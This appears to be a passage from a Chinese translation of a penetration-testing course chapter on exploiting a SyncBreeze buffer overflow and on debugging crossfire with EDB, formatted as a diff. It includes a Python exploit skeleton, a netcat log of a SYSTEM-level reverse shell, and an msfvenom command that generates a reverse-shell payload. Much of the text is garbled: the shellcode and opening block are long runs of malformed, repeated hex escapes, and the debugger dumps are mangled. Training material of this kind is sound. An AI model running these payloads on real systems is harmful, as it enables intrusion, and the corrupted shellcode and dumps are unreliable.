1\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x64\x74\x6\\xdxdxd1\xd59\nxd7\x20\x61\x71\x71\x61\x65\x65\x83\xc9\x55\xd78\xf9\xd94\xf24\nxd7\x20\x65\x76\x61\x64\xc8\x61\x55\x52\x53\x24\x74\x74\x79\x73\xd61\x5c\xe0\xd71\x64\x54\x64\x09\xa6\xa4\xa4\n\x55\x87\x80\x84\x47\xb4\x78\x87\x58\x32\xe3\xca\x55\xf3\nxe3\x60\x83\x61\x81\x02\xcb\x72\x87\x71\x88\x95\x87\x95\x81\xd7\nxd64\x63\x6a\x63\x63\x71\x67\x68\x85\x51\x52\x96\x61\x39\x38\xb8\x80\x71\xe5\x57\x51\x22\xf4\x61\x71\x64\x65\x65\x54\x74\x74\x71\x71\x68\x61\x61\x61\x61\x71\x61\x61\x61\x61\x65\x65\x64\x65\x64\xd7\x39\xd8\x12\x90\xxd2\x61\x51\x61\x61\x61\x61\x61\x62\x61\x62\x62\x54\x74\x64\x64\x64\x64\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x64\x74\x6\\xdxdxd1\xd59\nxd7\x20\x61\x71\x71\x61\x65\x65\x83\xc9\x55\xd78\xf9\xd94\xf24\nxd7\x20\x65\x76\x61\x64\xc8\x61\x55\x52\x53\x24\x74\x74\x79\x73\xd61\x5c\xe0\xd71\x64\x54\x64\x09\xa6\xa4\xa4\n\x55\x87\x80\x84\x47\xb4\x78\x87\x58\x32\xe3\xca\x55\xf3\nxe3\x60\x83\x61\x81\x02\xcb\x72\x87\x71\x88\x95\x87\x95\x81\xd7\nxd64\x63\x6a\x63\x63\x71\x67\x68\x85\x51\x52\x96\x61\x39\x38\xb8\x80\x71\xe5\x57\x51\x22\xf4\x61\x71\x64\x65\x65\x54\x74\x74\x71\x71\x68\x61\x61\x61\x61\x71\x61\x61\x61\x61\x65\x65\x64\x65\x64\xd7\x39\xd8\x12\x90\xxd2\x61\x51\x61\x61\x61\x61\x61\x62\x61\x62\x62\x54\x74\x64\x64\x64\x64\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x64\x74\x6\\xdxdxd1\xd59\nxd7\x20\x61\x71\x71\x61\x65\x65\x83\xc9\x55\xd78\xf9\xd94\xf24\nxd7\x20\x65\x76\x61\x64\xc8\x61\x55\x52\x53\x24\x74\x74\x79\x73\xd61\x5c\xe0\xd71\x64\x54\x64\x09\xa6\xa4\xa4\n\x55\x87\x80\x84\x47\xb4\x78\x87\x58\x32\xe3\xca\x55\xf3\nxe3\x60\x83\x61\x81\x02\xcb\x72\x87\x71\x88\x95\x87\x95\x81\xd7\nxd64\x63\x6a\x63\x63\x71\x67\x68\x85\x51\x52\x96\x61\x39\x38\xb8\x80\x71\xe5\x57\x51\x22\xf4\x61\x71\x64\x65\x65\x54\x74\x74\x71\x71\x68\x61\x61\x61\x61\x71\x61\x61\x61\x61\x65\x65\x64\x65\x64\xd7\x39\xd8\x12\x90\xxd2\x61\x51\x61\x61\x61\x61\x61\x62\x61\x62\x62\x54\x74\x64\x64\x64\x64\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x64\x74\x6\\xdxd1\xd59\nxd7\x20\x61\x71\x71\x61\x65\x65\x83\xc9\x55\xd78\xf9\xd94\xf24\nxd7\x20\x65\x76\x61\x64\xc8\x61\x55\x52\x53\x24\x74\x74\x79\x73\xd61\x5c\xe0\xd71\x64\x54\x64\x09\xa6\xa4\xa4\n\x55\x87\x80\x84\x47\xb4\x78\x87\x58\x32\xe3\xca\x55\xf3\nxe3\x60\x83\x61\x81\x02\xcb\x72\x87\x71\x88\x95\x87\x95\x81\xd7\nxd64\x63\x6a\x63\x63\x71\x67\x68\x85\x51\x52\x96\x61\x39\x38\xb8\x80\x71\xe5\x57\x51\x22\xf4\x61\x71\x64\x65\x65\x54\x74\x74\x71\x71\x68\x61\x61\x61\x61\x71\x61\x61\x61\x61\x65\x65\x64\x65\x64\xd7\x39\xd8\x12\x90\xxd2\x61\x51\x61\x61\x61\x61\x61\x62\x61\x62\x62\x54\x74\x64\x64\x64\x64\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x64\x64\x6\\\\xdxdxd1\xd59\nxd7\x20\x61\x71\x71\x61\x65\x65\x83\xc9\x55\xd78\xf9\xd94\\24\nxd7\x20\x65\x76\x61\x64\xc8\x61\x55\x52\x53\x24\x74\x74\x79\x73\xd61\x5c\xe0\xd71\x64\x54\x64\x09\xa6\xa4\xa4\n\x55\x87\x80\x84\x47\xb4\x78\x87\x58\x32\xe3\xca\x55\xf3\nxe3\x60\x83\x61\x81\x02\xcb\x72\x87\x71\x88\x95\x87\x95\x81\xd7\nxd64\x63\x6a\x63\x63\x71\x67\x68\x85\x51\x52\x96\x61\x39\x38\xb8\x80\x71\xe5\x57\x51\x22\xf4\x61\x71\x64\x65\x65\x54\x74\x74\x71\x71\x68\x61\x61\x61\x61\x71\x61\x61\x61\x61\x65\x65\x64\x65\x64\xd7\x39\xd8\x12\x90\xxd2\x61\x51\x61\x61\x61\x61\x61\x62\x61\x62\x62\x54\x74\x64\x64\x64\x64\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x64\x74\x6\\\\xdxdxd1\xd59\nxd7\x20\x61\x71\x71\x61\x65\x65\x83\xc9\x55\xd78\xf9\xd94\xf24\nxd7\x20\x65\x76\x61\x64\xc8\x61\x55\x52\x53\x24\x74\x74\x79\x73\xd61\x5c\xe0\xd71\x64\x54\x64\x09\xa6\xa4\xa4\n\x55\x87\x80\x84\x47\xb4\x78\x87\x58\x32\xe3\xca\x55\xf3\nxe3\x60\x83\x61\x81\x02\xcb\x72\x87\x71\x88\x95\x87\x95\x81\xd7\nxd64\x63\x6a\x63\x63\x71\x67\x68\x85\x51\x52\x96\x61\x39\x38\xb8\x80\x71\xe5\x57\x51\x22\xf4\x61\x71\x64\x65\x65\x54\x74\x74\x71\x71\x68\x61\x61\x61\x61\x71\x61\x61\x61\x61\x65\x65\x64\x65\x64\xd7\x39\xd8\x12\x90\xxd2\x61\x51\x61\x61\x61\x61\x61\x62\x61\x62\x62\x54\x74\x64\x64\x64\x64\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x64\x74\x6\\\\xdxd1\xd59\nxd)
+```
+
+
+
+```python
+#!/usr/bin/python
+import socket
+
+try:
+    print("exploding buffer...")
+
+    shellcode = "(\xbe\x55\x5e\x61\x72\x6b\x02\x9a\xc9\x74\x24\xf4\xa5\xc9\xb1\x52\x51\x72\x72\x77\x71\x83\xe1\x54\x47\x65\x62\x02\x14\x14\xxf8\x38\xd31\x70\x71\x62\x62\x73\x74\x04\xc06\xdxd1\xd59\nxd7\x20\x61\x71\x71\x61\x65\x65\x83\xc9\x55\xd78\xf9\xd94\xf24\nxd7\x20\x65\x76\x61\x64\xc8\x61\x55\x52\x53\x24\x74\x74\x79\x73\xd61\x5c\xe0\xd71\x64\x54\x64\x09\xa6\xa4\xa4\n\x55\x87\x80\x84\x47\xb4\x78\x87\x58\x32\xe3\xca\x55\xf3\nxe3\x60\x83\x61\x81\x02\xcb\x72\x87\x71\x88\x95\x87\x95\x81\xd7\nxd64\x63\x6a\x63\x63\x71\x67\x68\x85\x51\x52\x96\x61\x39\x38\xb8\x80\x71\xe5\x57\x51\x22\xf4\x61\x71\x64\x65\x65\x54\x74\x74\x71\x71\x68\x61\x61\x61\x61\x71\x61\x61\x61\x61\x65\x65\x64\x65\x64\xd7\x39\xd8\x12\x90\xxd2\x61\x51\x61\x61\x61\x61\x61\x62\x61\x62\x62\x54\x74\x64\x64\x64\x64\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x64\x74\x6\\\\xdxdxd1\xd59\nxd7\x20\x61\x71\x71\x61\x65\x65\x83\xc9\x55\xd78\xf9\xd94\xf24\nxd7\x20\x65\x76\x61\x64\xc8\x61\x55\x52\x53\x24\x74\x74\x79\x73\xd61\x5c\xe0\xd71\x64\x54\x64\x09\xa6\xa4\xa4\n\x55\x87\x80\x84\x47\xb4\x78\x87\x58\x32\xe3\xca\x55\xf3\nxe3\x60\x83\x61\x81\x02\xcb\x72\x87\x71\x88\x95\x87\x95\x81\xd7\nxd64\x63\x6a\x63\x63\x71\x67\x68\x85\x51\x52\x96\x61\x39\x38\xb8\x80\x71\xe5\x57\x51\x22\xf4\x61\x71\x64\x65\x65\x54\x74\x74\x71\x71\x68\x61\x61\x61\x61\x71\x61\x61\x61\x61\x65\x65\x64\x65\x64\xd7\x39\xd8\x12\x90\xxd2\x61\x51\x61\x61\x61\x61\x61\x62\x61\x62\x62\x54\x74\x64\x64\x64\x64\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61
+```
+
+## 列表 362 - 最终漏洞利用
+
+为了预期反向 shell 负载，我们在攻击机的 `443` 端口上配置了 `Netcat` 监听器并执行了漏洞利用脚本。很快，我们希望能够从受害者机器获得一个 shell：
+
+```
+kali@kali:~ sudo nc -lnvp 443
+listening on [any] 443 ...
+connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 57692
+Microsoft Windows [Version 10.0.17134]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\windows\system32> whoami
+nt authority\system
+C:\windows\system32>
+```
+
+## 列表 363 - 接收反向 shell
+
+太棒了！它有效了。我们从开始创建了一个缓冲区溢出的完整漏洞利用程序。仍然有一个小不便需要解决。注意当我们退出反向 shell 时，`SyncBreeze` 服务崩溃了，这远非理想。
+
+### 11.2.9.1 练习
+
+- 更新你的 PoC 以包含一个有效的负载。
+- 尝试在不使用 NOP 滑块的情况下执行漏洞利用，并观察解码器损坏栈。
+- 在 PoC 中添加 NOP 滑块并从 `SyncBreeze` 获取 shell。
+
+# 改进漏洞利用
+
+### 11.2.10 Metasploit shellcode 执行后的默认退出方法是 `ExitProcess` API。这种退出方法会在 shell 释放后关闭 Web 服务，从而导致 `SyncBreeze` 服务崩溃。
+
+如果我们正在利用的程序是一个多线程应用程序（在本例中确实如此），我们可以尝试使用 `ExitThread` API 来避免完全崩溃，因为它只会终止受影响的线程。要指示 `msvenom` 在生成 shellcode 时使用 `ExitThread` 方法，可以在以下命令中使用 `EXITFunc` 选项：
+
+```
+kali@~$ msvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
+```
+
+## 列表 364 - 使用 ExitThread 生成 shellcode
+
+### 11.2.10.1 练习
+
+- 更新漏洞利用程序，使 `Synccreeze` 在利用后仍继续运行。
+
+### 额外里程练习
+
+在你的 Windows 虚拟机的 `Tools` 文件夹中，有三个名为 `VulnApp1.exe`、`VulnApp2.exe` 和 `VulnApp3.exe` 的应用程序，每个都包含一个漏洞。
+
+## 11.3 总结
+
+在本模块中，我们发现并利用了 `SyncBreeze`。尽管这是一个已知漏洞，但我们演示了发现它所需的步骤。首先，我们操纵内存获取代码执行权限。然后，我们遵循缓冲区溢出的流程。具体来说，通过向设置命令传递更多字节的字符串来引入 Linux 缓冲区溢出。
+
+版权 © Offensive Security. 保留所有权利。
+
+# 攻击性安全
+
+使用 Kali Linux 2.0 进行渗透测试
+
+`CFAnim 2.0a init`
+
+`CFAnim 2.0a post init`
+
+等待连接...
+
+## 列表 365 - 通过终端启动漏洞应用程序
+
+
+
+一旦 `crossfire` 启动，它将接受传入的网络连接。接下来，我们将通过运行 `edb` 命令启动 EDB 调试器：
+
+```
+root@debian:~# edb
+Starting edb version: 0.9.22
+Please Report Bugs & Requests At: https://github.com/eteran/edb-debugger/issues
+comparing versions: [2325] [2326]
+```
+
+列表 366 - 通过终端启动调试器
+
+EDB 的布局与其他流行的调试工具类似，如图 222 所示：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_396_0.png)
+
+图 222：EDB 界面
+
+要查看包括 PID 和所有者在可用进程，我们将从 File（文件）菜单中选择 Attach（附加）。然后我们可以使用过滤选项来搜索特定进程，在我们的案例中是 `crossfire`，选择它并点击 OK（确定）以附加它：
+
+## 附加到进程
+
+过滤 `crossfire` 仅显示我的 UID 的条目
+
+| PID | UID | 名称 |
+|---|---|---|
+| 1432 | kali | crossfire |
+
+图 223：EDB - 可附加进程
+
+当我们开始附加到该进程时，它将会被暂停。要运行它，我们只需点击 `Run` 按钮。根据应用程序在调试器中的工作方式，它可能会在允许应用程序运行之前命中意外的断点。在这种情况下，我们必须再次点击一次 `Run` 按钮。
+
+```
+ebd /usr/games/crossfire/bin/crossfire [32431]
+```
+
+查看调试插件 选项 帮助 [vdso] 未找到分析
+
+| | | 寄存器 |
+|---|---|---|
+
+| 00000000 7f 45 46 7f 45 46 00 01 01 01 00 00 00 00 00 00 ELP... | rffate EESTHEARTXHAND orig: 0x00000000 |
+| 00000004 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | rfffe230 |
+| 00000008 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | rfffe234 |
+| 0000000c 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | rfffe238 |
+| 00000010 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000090 |
+| 00000014 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000050 |
+| 00000018 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000050 |
+| 0000001c 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000054 |
+| 00000020 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000058 |
+| 00000024 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00005c |
+| 00000028 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000060 |
+| 0000002c 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000064 |
+| 00000030 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000068 |
+| 00000034 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00006c |
+| 00000038 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000070 |
+| 0000003c 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000074 |
+| 00000040 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000078 |
+| 00000044 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00007c |
+| 00000048 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000080 |
+| 0000004c 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000084 |
+| 00000050 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000088 |
+| 00000054 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00008c |
+| 00000058 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000090 |
+| 0000005c 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000094 |
+| 00000060 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000098 |
+| 00000064 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00009c |
+| 00000068 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000a0 |
+| 0000006c 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000a4 |
+| 00000070 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000a8 |
+| 00000074 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000ac |
+| 00000078 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000b0 |
+| 0000007c 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000b4 |
+| 00000080 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000b8 |
+| 00000084 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000bc |
+| 00000088 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000c0 |
+| 0000008c 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000c4 |
+| 00000090 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000c8 |
+| 00000094 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000cc |
+| 00000098 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00001d0 |
+| 0000009c 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00001d4 |
+| 000000a0 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00001d8 |
+| 000000a4 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00001dc |
+| 000000a8 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00001e0 |
+| 000000ac 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00001e4 |
+
+
+
+```
+| 000000b0 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00001e8 |
+| 000000b4 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00001ec |
+| 000000b8 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00001f0 |
+| 000000bc 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00001f4 |
+| 000000c0 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00001f8 |
+| 000000c4 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00001fc |
+| 000000c8 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000200 |
+| 000000cc 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000204 |
+| 000000d0 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000208 |
+| 000000d4 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000020c |
+| 000000d8 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000210 |
+| 000000dc 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000214 |
+| 000000e0 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000218 |
+| 000000e4 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000021c |
+| 000000e8 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000220 |
+| 000000ec 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000224 |
+| 000000f0 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000228 |
+| 000000f4 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000022c |
+| 000000f8 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000230 |
+| 000000fc 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000234 |
+| 000000fc 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000238 |
+| 00000100 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000230 |
+| 00000104 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000023c |
+| 00000108 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000240 |
+| 0000010c 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000244 |
+| 00000110 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000248 |
+| 00000114 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000024c |
+| 00000118 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000250 |
+| 0000011c 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000254 |
+| 00000120 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000258 |
+| 00000124 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000025c |
+```
+
+中断系统调用：`newselect(0xd4,0xfffffff30,0x0,0x0,0xffffff00)`
+
+ebd 在下一步中重启
+
+| 数据转储 |
+
+|---|---|
+
+```
+| 00000000-0000252900 | |
+| 00000000 7f 45 46 7f 45 46 00 01 01 01 00 00 00 00 00 00 00 00 | ELP... |
+| 00000004 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | | |
+| 00000008 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | | |
+| 0000000c 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | | |
+| 00000010 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000050 |
+| 00000014 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | | |
+| 00000018 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000000 |
+| 0000001c 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000054 |
+| 00000020 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000058 |
+| 00000024 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00000 | 000005c |
+  00000028 7f 45 46 7f 45 46 00 00 00 00 00 00 00000 00 00 | 0000060 |
+| 0000002c 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000064 |
+| 00000030 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000068 |
+| 00000034 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000006c |
+| 00000038 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000070 |
+| 0000003c 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000074 |
+| 00000040 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000078 |
+| 00000044 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000007c |
+| 00000048 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000080 |
+| 0000004c 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000084 |
+| 00000050 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000088 |
+| 00000054 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000008c |
+| 00000058 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000090 |
+```
+
+
+
+```
+| 0000005c 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000094 |
+| 00000060 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000098 |
+| 00000064 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000009c |
+| 00000068 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00000a0 |
+| 0000006c 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00000a4 |
+| 00000070 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00000a8 |
+| 00000074 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00000ac |
+| 00000078 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00000b0 |
+| 0000007c 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00000b4 |
+| 00000080 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00000b8 |
+| 00000084 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00000bc |
+| 00000088 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00000c0 |
+| 0000008c 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00000c4 |
+| 00000090 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00000c8 |
+| 00000094 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00000cc |
+| 00000098 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00001d0 |
+| 0000009c 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00001d4 |
+| 000000a0 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00001d8 |
+| 000000a4 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00001dc |
+| 000000a8 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00001e0 |
+| 000000ac 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00001e4 |
